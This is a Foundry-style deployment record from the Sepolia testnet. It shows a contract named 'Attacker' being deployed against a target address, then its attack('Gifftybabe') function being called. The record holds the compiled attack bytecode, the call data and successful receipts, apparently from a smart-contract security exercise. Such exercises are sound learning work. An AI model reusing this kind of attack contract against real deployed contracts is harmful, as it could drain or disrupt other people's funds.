{
  "transactions": [
    {
      "hash": "0xfe70bd6c861a6041c13eb661fd1efb974fe7a7aaf861badd61a038ecfdcb7361",
      "transactionType": "CREATE",
      "contractName": "Attacker",
      "contractAddress": "0xdcaa03afbb8b02c825bf9638461e795bebb37d7c",
      "function": null,
      "arguments": [
        "0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249"
      ],
      "transaction": {
        "from": "0x5f5dbadc077c43c518e0011df7684726d75dba76",
        "gas": "0x564c1",
        "value": "0x0",
        "input": "0x60806040526000805460ff60a01b1916905534801561001d57600080fd5b5060405161042138038061042183398101604081905261003c91610061565b600080546001600160a01b0319166001600160a01b0392909216919091179055610091565b60006020828403121561007357600080fd5b81516001600160a01b038116811461008a57600080fd5b9392505050565b610381806100a06000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063aabb75541461011a575b600054600160a01b900460ff16610118576000805460ff60a01b198116600160a01b17825560408051600481526024810182526020810180516001600160e01b0316634c228cc760e01b17905290516001600160a01b03909216916100909190610235565b6000604051808303816000865af19150503d80600081146100cd576040519150601f19603f3d011682016040523d82523d6000602084013e6100d2565b606091505b50509050806101165760405162461bcd60e51b815260206004820152600b60248201526a131bd8dac819985a5b195960aa1b60448201526064015b60405180910390fd5b505b005b610118610128366004610267565b600080546040516001600160a01b0390911690610149908490602401610318565b60408051601f198184030181529181526020820180516001600160e01b031663065ca49360e31b1790525161017e9190610235565b6000604051808303816000865af19150503d80600081146101bb576040519150601f19603f3d011682016040523d82523d6000602084013e6101c0565b606091505b50509050806102015760405162461bcd60e51b815260206004820152600d60248201526c105d1d1858dac819985a5b1959609a1b604482015260640161010d565b5050565b60005b83811015610220578181015183820152602001610208565b8381111561022f576000848401525b50505050565b60008251610247818460208701610205565b9190910192915050565b634e487b7160e01b600052604160045260246000fd5b60006020828403121561027957600080fd5b813567ffffffffffffffff8082111561029157600080fd5b818401915084601f8301126102a557600080fd5b8135818111156102b7576102b7610251565b604051601f8201601f19908116603f011681019083821181831017156102df576102df610251565b816040528281528760208487010111156102f857600080fd5b826020860160208301376000928101602001929092525095945050505050565b6020815260008251806020840152610337816040850160208701610205565b601f01601f1916919091016040019291505056fea2646970667358221220d19951602fa73da777279fbc4a3355fc8b5d9efe476bcd920c3d428392fa6d3664736f6c634300080d0033000000000000000000000000771f8f8fd270ed99db6a3b5b7e1d9f6417394249",
        "nonce": "0xa",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xab2f78151a957d6365b0118e7019f7c0f02971cc1175497e4aeda537d3a1119a",
      "transactionType": "CALL",
      "contractName": "Attacker",
      "contractAddress": "0xdcaa03afbb8b02c825bf9638461e795bebb37d7c",
      "function": "attack(string)",
      "arguments": [
        "Gifftybabe"
      ],
      "transaction": {
        "from": "0x5f5dbadc077c43c518e0011df7684726d75dba76",
        "to": "0xdcaa03afbb8b02c825bf9638461e795bebb37d7c",
        "gas": "0x26bfa",
        "value": "0x0",
        "input": "0xaabb75540000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a4769666674796261626500000000000000000000000000000000000000000000",
        "nonce": "0xb",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xc5df8c",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xfe70bd6c861a6041c13eb661fd1efb974fe7a7aaf861badd61a038ecfdcb7361",
      "transactionIndex": "0x48",
      "blockHash": "0x859812c33671e4c3ed7caf479b0afcb81fc712ba1670e65e3fa851a8aca05c25",
      "blockNumber": "0x6a04c2",
      "gasUsed": "0x42665",
      "effectiveGasPrice": "0x39574edf",
      "from": "0x5f5dbadc077c43c518e0011df7684726d75dba76",
      "to": null,
      "contractAddress": "0xdcaa03afbb8b02c825bf9638461e795bebb37d7c"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xc78777",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xab2f78151a957d6365b0118e7019f7c0f02971cc1175497e4aeda537d3a1119a",
      "transactionIndex": "0x49",
      "blockHash": "0x859812c33671e4c3ed7caf479b0afcb81fc712ba1670e65e3fa851a8aca05c25",
      "blockNumber": "0x6a04c2",
      "gasUsed": "0x1a7eb",
      "effectiveGasPrice": "0x39574edf",
      "from": "0x5f5dbadc077c43c518e0011df7684726d75dba76",
      "to": "0xdcaa03afbb8b02c825bf9638461e795bebb37d7c",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1729928140,
  "chain": 11155111,
  "commit": "c266df2"
}